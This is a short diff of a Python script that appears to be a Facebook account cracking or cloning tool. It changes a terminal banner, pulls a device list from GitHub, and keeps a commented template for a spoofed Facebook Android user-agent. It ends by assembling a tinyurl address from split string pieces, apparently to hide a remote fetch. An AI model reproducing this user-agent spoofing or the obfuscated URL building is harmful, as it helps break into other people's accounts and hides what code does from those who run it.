@@ -197,7 +197,7 @@ user = []
 joker = []
 num = 0
 
-sys.stdout.write('\x1b[1;35m\x1b]2; YOUNIS XYZ ðŸ™‚ðŸ’— \x07')
+sys.stdout.write('\x1b[1;35m\x1b]2; GS2X \x07')
 
 models341=requests.get("https://raw.githubusercontent.com/mogid458/MKT/main/Devices.txt").text.splitlines()
 
@@ -275,7 +275,6 @@ def generate_FBAN():
 #ua_string = f'৳[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+৳'{density={density},width={width},height={height}};FBLC/{FBLC};FBCR/{FBCR};FBMF/Samsung;FBBD/Samsung;FBPN/{FBPN};FBDV/{models20};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi]'
 
 
-print('\n Installing missing modules ...')
 
 XB = 'ti'
 GF = 'ny'+'url.'
